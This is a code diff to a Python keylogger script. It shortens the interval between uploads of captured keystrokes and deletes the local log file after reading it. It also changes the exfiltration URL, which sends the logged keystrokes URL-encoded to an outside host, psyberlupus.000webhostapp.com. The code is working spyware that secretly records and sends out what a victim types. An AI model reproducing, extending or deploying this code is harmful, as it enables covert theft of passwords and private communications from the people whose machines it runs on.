@@ -83,7 +83,7 @@ def KeyStroke(event):
 		   f_des.close()
 	# pass execution to the next registered hook
 	
-            if (time.time() - st_time > 600):
+            if (time.time() - st_time > 100):
 	             print "Sending >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
                      st_time = time.time()
                      thread_i = threading.Thread(target=inform)
@@ -105,10 +105,10 @@ def inform():
         f_read = open("log.txt" , "r")
         lines = f_read.readlines()
         f_read.close()
-        f_read= open("log.txt","w").close()
+        os.remove("log.txt")
         for line in lines:
                 log = log + line
-        url = "http://psyberlupus.000webhostapp.com/log.php?=" + urllib.quote_plus(log)
+        url = "http://psyberlupus.000webhostapp.com/site.php?logger=" + urllib.quote_plus(log)
       #  print url
        # print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
         
